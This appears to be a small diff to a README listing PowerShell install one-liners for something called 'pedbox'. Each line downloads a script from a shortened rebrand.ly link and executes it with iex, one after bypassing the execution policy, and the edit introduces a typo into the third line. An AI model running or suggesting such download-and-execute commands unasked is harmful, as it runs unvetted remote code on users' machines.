@@ -39,7 +39,7 @@
 
 - cmd.exe /c powershell -command "Set-ExecutionPolicy Bypass -Scope Process -Force; iex(irm rebrand.ly/pedbox)"
 - cmd.exe /c powershell "& "iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/pedbox'))""
-- powershell .\p.cmd(irm rebrand.ly/pedboxbat -o p.cmd)
+- powershell .\p cmd(irm rebrand.ly/pedboxbat -o p.cmd)
 
 ## PowerShell Link 
 
